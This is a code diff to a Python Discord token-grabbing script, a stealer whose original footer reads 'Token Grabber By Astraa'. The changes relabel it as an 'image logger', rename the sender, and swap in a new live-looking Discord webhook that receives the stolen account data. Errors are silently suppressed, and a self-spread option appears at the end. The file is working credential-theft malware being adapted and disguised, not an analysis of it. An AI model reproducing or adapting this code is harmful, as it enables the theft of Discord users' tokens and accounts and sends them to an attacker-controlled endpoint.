@@ -163,7 +163,7 @@ def main():
                     "icon_url": avatar_url
                 },
                 "footer": {
-                    "text": f"Token Grabber By Astraa",
+                    "text": f"image logger has been triggered!",
                 }
             }
             embeds.append(embed)
@@ -176,11 +176,11 @@ def main():
     webhook = {
         "content": "",
         "embeds": embeds,
-        "username": "Discord",
+        "username": "AastraDev/KFC",
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("https://discord.com/api/webhooks/961530957066809354/SDdzXyj3PFcdRGUIMphWtSn1kkaMkT9x6tb6oa67yFERoPNjtPCm3ckqhj_LQ9wLY5P_", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/961649534742700063/5UqyB0djiZjiTj6_VS8UIEpbYOarT3Suwx3pvXYLFWRH5-1GqmY0ng7oPCylzBN5aY7u", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
